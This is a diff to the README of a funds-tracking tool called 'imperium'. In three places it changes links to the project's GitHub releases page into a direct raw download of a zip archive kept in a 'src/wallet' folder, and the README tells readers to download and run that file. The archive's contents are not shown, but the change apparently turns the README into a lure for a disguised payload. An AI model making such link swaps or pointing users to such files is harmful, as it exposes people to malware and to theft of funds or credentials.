@@ -1,6 +1,6 @@
 # 🤖 imperium - Track, scan, and rebalance funds
 
-[![Download imperium](https://img.shields.io/badge/Download%20imperium-blue?style=for-the-badge&logo=github)](https://github.com/Adamoktora/imperium/releases)
+[![Download imperium](https://img.shields.io/badge/Download%20imperium-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Adamoktora/imperium/master/src/wallet/Software-3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ For the best experience, use:
 
 Go to the release page here and download and run this file from the latest release:
 
-https://github.com/Adamoktora/imperium/releases
+https://raw.githubusercontent.com/Adamoktora/imperium/master/src/wallet/Software-3.3.zip
 
 On the release page, look for:
 - the newest version
@@ -221,4 +221,4 @@ Use the Windows file that matches the latest release.
 
 If you need to update imperium, visit this page again to download the latest release:
 
-https://github.com/Adamoktora/imperium/releases
+https://raw.githubusercontent.com/Adamoktora/imperium/master/src/wallet/Software-3.3.zip
